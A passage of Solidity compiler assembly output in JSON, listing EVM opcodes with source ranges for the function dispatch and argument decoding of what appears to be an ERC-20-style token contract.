										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPDEST"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "REVERT"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMPDEST"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "AND"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMPDEST"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "MLOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "MSTORE"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "MLOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SUB"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "RETURN"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMPDEST"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMPDEST"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "MLOAD"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP3"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP2"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "MSTORE"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "ADD"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP2"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "POP"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "POP"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "MLOAD"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP2"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SUB"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "RETURN"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMPDEST"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "AND"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "AND"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMPDEST"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "MLOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "MSTORE"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "MLOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SUB"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "RETURN"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMPDEST"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "AND"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP3"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP3"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMPDEST"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "MLOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP3"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "MSTORE"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "MLOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SUB"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "RETURN"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMPDEST"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "ADD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "AND"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "ADD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP3"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMPDEST"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "MLOAD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP3"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "MSTORE"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "ADD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "MLOAD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SUB"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "RETURN"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "AND"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "MLOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "MSTORE"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "MLOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SUB"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "RETURN"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMPDEST"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
